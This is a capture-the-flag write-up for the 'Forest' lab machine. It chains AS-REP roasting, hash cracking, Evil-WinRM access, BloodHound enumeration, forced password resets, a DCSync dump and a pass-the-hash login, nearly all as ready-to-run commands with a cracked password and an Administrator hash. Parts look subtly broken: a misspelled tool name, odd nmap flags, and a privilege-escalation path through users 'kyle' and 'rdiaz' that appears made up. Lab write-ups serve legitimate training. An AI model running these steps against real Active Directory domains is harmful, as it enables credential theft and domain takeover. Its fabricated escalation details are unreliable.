# Forest

### Summary

* The machine was vulnerable to **AS-REP roasting**, and we found that `svc-alfresco` had `Do not require Kerberos preauthentication` enabled.
* Extracted the AS-REP hash using `GetNPUsers` and cracked it with John to retrieve the password: `s3rvice`.
* Used **Evil-WinRM** to log in as `svc-alfresco` and got the user flag.
* Ran **BloodHound** and discovered:
  * `svc-alfresco` has **ownership** over users `kyle` and `rdiaz`.
  * `kyle` has **DCSync** rights over the domain.
* Reset the passwords for both `kyle` and `rdiaz` using `rpcclient`.
* Performed **DCSync** attack using `kyle` to dump **Administrator's NTLM hash**.
* Used that hash with Evil-WinRM to gain an elevated shell and grab the root flag.

***

## Enumeration

```bash
sudo nmap -A -sC -sN -p- -oN forest_tcp.nmap -T4 10.10.10.161
```

***

#### Enumerating SMB

```bash
crackmapexec smb 10.10.10.161 --users
```

Discovered valid users:

```
sebastien, lucinda, svc-alfresco, andy, mark, santi, kyle, rdiaz, Administrator
```

Checked for AS-REP roasting:

```bash
timpacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request -outputfile hashes
```

Found:

```
svc-alfresco@htb.local has no pre-auth required. AS-REP hash dumped.
```

Cracked it with:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

Recovered password:

```
s3rvice
```

***

## Initial Foothold

Used Evil-WinRM to connect:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

User shell landed — ✅ Got user flag!

***

## Privilege Escalation

Ran **BloodHound** using `bloodhound-python`:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -c All -ns 10.10.10.161
```

Key Finding:

* `svc-alfresco` **owns**:
  * `kyle` (has **DCSync** rights)
  * `rdiaz` (has special access in Forest.HTB.local)

Used `rpcclient` to change passwords of owned users:

```bash
rpcclient -U 'svc-alfresco' 10.10.10.161
setuserinfo2 kyle 23 'Password@123'
setuserinfo2 rdiaz 23 'Password@123'
```

Performed **DCSync attack**:

```bash
impacket-secretsdump -just-dc-user Administrator htb.local/kyle:'Password@123'@10.10.10.161
```

Dumped the Administrator’s hash:

```
aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

Used it to log in with Evil-WinRM:

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

Got SYSTEM shell — 🎯 Grabbed `root.txt`!
